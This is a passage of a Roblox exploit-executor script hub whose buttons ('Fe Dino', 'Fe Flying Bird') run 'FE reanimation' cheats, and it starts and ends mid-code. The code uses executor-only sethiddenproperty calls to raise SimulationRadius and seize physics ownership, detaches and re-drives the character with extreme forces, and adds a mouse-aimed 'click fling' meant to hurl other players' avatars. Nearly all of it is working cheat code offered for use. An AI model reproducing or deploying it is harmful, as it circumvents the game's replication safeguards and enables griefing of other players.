part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  char.Torso['Left Shoulder']:Destroy() char.Torso['Right Shoulder']:Destroy() char.Torso['Left Hip']:Destroy() char.Torso['Right Hip']:Destroy()  create(char['Torso'],reanim['Torso']) create(char['Left Arm'],reanim['Left Arm']) create(char['Right Arm'],reanim['Right Arm']) create(char['Left Leg'],reanim['Left Leg']) create(char['Right Leg'],reanim['Right Leg'])  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  reanim.Parent = fl  table.insert(ct,srv.Heartbeat:Connect(function() char.Torso.CFrame=reanim.Torso.CFrame char.Torso.Velocity=Vector3.new(40000,40000,0) end))  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  table.insert(ct,reanim.Humanoid.Died:Connect(function() plr.Character = char char:BreakJoints() reanim:Destroy() game.Players:Chat('-gr') _G.netless:Disconnect() HumanDied = true for _,v in pairs(ct) do v:Disconnect() end end))  plr.Character = reanim workspace.CurrentCamera.CameraSubject = reanim.Humanoid

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = game.Players.LocalPlayer.Character

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

-- for modes u can go in this link : https://Nexo.notxeneon15.repl.co/nexo/modes.lua

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if reanim.Humanoid.Jump then -- jump
--jump clerp here
elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
--fall clerp here
elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(-0.4+0*math.cos(sine/10),-0.68+0.2*math.cos(sine/10),0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-0.68+0.2*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-0.14+0.2*math.cos(sine/10),0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-0.14+0.2*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(-0.4+0*math.cos(sine/10),-0.68+0.2*math.cos(sine/10),0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+66.72*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-0.68+0.2*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-40.27*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-0.14+0.2*math.cos(sine/10),0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-47.91*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-0.14+0.2*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+43.79*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
--run clerp here
end
srv.RenderStepped:Wait()
end
end)()
--Created using Nexo Animator V4
end)

Section:NewButton("Fe Dino(Need: pal hair)", "Dinosaur", function()
clickfling = true -- set this to false if u dont want click fling or use torso fling

function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {} local te = table.insert local m = plr:GetMouse()  if char:FindFirstChild('Pal Hair') then else return end  _G.Jitter=Vector3.new(0,30,0)  for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") and v.Name ~= 'HumanoidRootPart' then  bf=Instance.new('BodyForce',v) bf.Force=Vector3.new(50,50,50) te(ct,game:GetService("RunService").Heartbeat:connect(function() pcall(function() v.Velocity = _G.Jitter v.BodyForce.Force=Vector3.new(50,50,50) game.Players.LocalPlayer.ReplicationFocus=workspace sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",9e9) end) end)) end end  char.Archivable = true fl=Instance.new('Folder',char) fl.Name = 'ArmFling' local reanim = char:Clone() char.Humanoid:ChangeState(16) char.HumanoidRootPart:Destroy()  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  hats=0 function create(part, parent, p, r) hats=hats+1 Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name..hats parent.Attachment.Name = part.Name..hats part.AlignPosition.Attachment0 = part[part.Name..hats] part.AlignOrientation.Attachment0 = part[part.Name..hats] part.AlignPosition.Attachment1 = parent[part.Name..hats] part.AlignOrientation.Attachment1 = parent[part.Name..hats] parent[part.Name..hats].Position = p or Vector3.new() part[part.Name..hats].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  function Pos(part, parent, p) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part.AlignPosition.MaxForce = 999999999*10 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false end  function nc(p) if p:IsA('BasePart') or p:IsA('Part') then te(ct,srv.Stepped:Connect(function() p.CanCollide=false end)) te(ct,srv.RenderStepped:Connect(function() p.CanCollide=false end)) else print('Cannot noclip '..p) end end  function af() for i,v in next, game.Players:GetDescendants() do if v:IsA('Player') and v.Name ~= game.Players.LocalPlayer.Name then for _,c in next, v.Character:GetDescendants() do if c:IsA('BasePart') and v.Parent== char then noo=Instance.new('NoCollisionConstraint',c) noo.Part1=char['Torso'] noo.Part0=c noo2=Instance.new('NoCollisionConstraint',c) noo2.Part1=char['Head'] noo2.Part0=c end end end end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then nc(v) end end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') and v.Name ~= 'Pal Hair' then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then nc(v) end end  for i,v in next, char:GetDescendants() do if v:IsA('Motor6D') and v.Name ~= 'Neck' then v:Destroy() end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') and v.Name ~= 'Right Leg' and v.Name ~= 'Head' and v.Parent == char then create(v,reanim[v.Name]) end end  function flinger(p) f=Instance.new('BodyAngularVelocity',p) f.P=9e9*10 f.AngularVelocity = Vector3.new(9e9*10,9e9*10,9e9*10) f.MaxTorque=Vector3.new(9e9*10,0,0) return f end  Pos(char['Right Leg'],reanim['Torso']) fliiiin=flinger(char['Right Leg'])  char['Pal Hair'].Handle:BreakJoints() char['Pal Hair'].Handle.Mesh:Destroy()  create(char['Pal Hair'].Handle,reanim['Right Leg'],Vector3.new(),Vector3.new(90,0,0))  reanim.Animate.Disabled=true  reanim.Parent=fl  sh=false  fp=Instance.new('Part',reanim) fp.Name='FlingPart' fp.CanCollide=false fp.Transparency=1 if clickfling then te(ct,m.Button1Down:Connect(function() sh=true end))  te(ct,m.Button1Up:Connect(function() sh=false end)) end te(ct,srv.Heartbeat:Connect(function() m.TargetFilter=char if sh then fp.CFrame=CFrame.new(m.Hit.p) char['Right Leg'].Position=fp.Position else fp.CFrame=char.Torso.CFrame*CFrame.new(0,0,0) char['Right Leg'].Position=fp.Position end end))  plr.Character=reanim workspace.Camera.CameraSubject=reanim  HumanDied=false  te(ct,reanim.Humanoid.Died:Connect(function() HumanDied=true fliiiin:Destroy() reanim.HumanoidRootPart.Anchored=true old=reanim.HumanoidRootPart.CFrame reanim.HumanoidRootPart.CFrame=old wait() reanim.HumanoidRootPart.CFrame=old char.Humanoid:Destroy() Instance.new('Humanoid',char) plr.Character=char char:BreakJoints() game.Players:Chat('-gr') for i,v in next, ct do v:Disconnect() end end))

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = game.Players.LocalPlayer.Character

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

-- for modes u can go in this link : https://Nexo.notxeneon15.repl.co/nexo/modes.lua

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if reanim.Humanoid.Jump then -- jump
--jump clerp here
elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
--fall clerp here
elseif Root.Velocity.Magnitude < 2 then -- idle
hat('Pal Hair','Head',CFrame.new(0,0,0),CFrame.new(0+0*math["cos"](sine/10),0+0*math["cos"](sine/10),0+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),false)
--NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(-0.14+0*math.cos(sine/10),-0.68+0*math.cos(sine/10),0.39+0*math.cos(sine/10))*CFrame.Angles(math.rad(-116.68+-9.7*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-0.14+0*math.cos(sine/10),-0.68+0*math.cos(sine/10),1.47+0*math.cos(sine/10))*CFrame.Angles(math.rad(-116.68+-9.7*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
hat('Pal Hair','Head',CFrame.new(0,0,0),CFrame.new(0+0*math["cos"](sine/10),0+0*math["cos"](sine/10),0+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),false)
--NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0.1*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-40.27+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(-0.14+0*math.cos(sine/10),-0.68+0*math.cos(sine/10),0.39+0*math.cos(sine/10))*CFrame.Angles(math.rad(-116.68+-9.7*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-0.14+0*math.cos(sine/10),-0.68+0*math.cos(sine/10),1.47+0*math.cos(sine/10))*CFrame.Angles(math.rad(-116.68+-9.7*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(36.15+30*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(36.15+-30*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
--run clerp here
end
srv.RenderStepped:Wait()
end
end)()
--Created using Nexo Animator V4 MADE BY REDMOON
end)




Section:NewButton("Fe Flying Bird", "Wtf", function()
--MADE BY DELECTIV/GUAVAJUICEFANCLUBFAN
--SUBSCRIBE TO DARK ECCENTRIC
function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

HumanDied = false for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") then  _G.netless=game:GetService("RunService").Heartbeat:connect(function() v.AssemblyLinearVelocity = Vector3.new(-30,0,0) sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999) end) end end  local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {}  char.Archivable = true local reanim = char:Clone() reanim.Name = 'Nexo '..plr.Name..'' fl=Instance.new('Folder',char) fl.Name ='Nexo' reanim.Animate.Disabled=true char.HumanoidRootPart:Destroy() char.Humanoid:ChangeState(16)  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  function create(part, parent, p, r) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignOrientation.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] part.AlignOrientation.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part[part.Name].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  char.Torso['Left Shoulder']:Destroy() char.Torso['Right Shoulder']:Destroy() char.Torso['Left Hip']:Destroy() char.Torso['Right Hip']:Destroy()  create(char['Torso'],reanim['Torso']) create(char['Left Arm'],reanim['Left Arm']) create(char['Right Arm'],reanim['Right Arm']) create(char['Left Leg'],reanim['Left Leg']) create(char['Right Leg'],reanim['Right Leg'])  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  reanim.Parent = fl  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  table.insert(ct,reanim.Humanoid.Died:Connect(function() plr.Character = char char:BreakJoints() reanim:Destroy() game.Players:Chat('-gr') _G.netless:Disconnect() HumanDied = true for _,v in pairs(ct) do v:Disconnect() end end))  plr.Character = reanim workspace.CurrentCamera.CameraSubject = reanim.Humanoid

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = game.Players.LocalPlayer.Character

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

-- for modes u can go in this link : https://Nexo.notxeneon15.repl.co/nexo/modes.lua

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
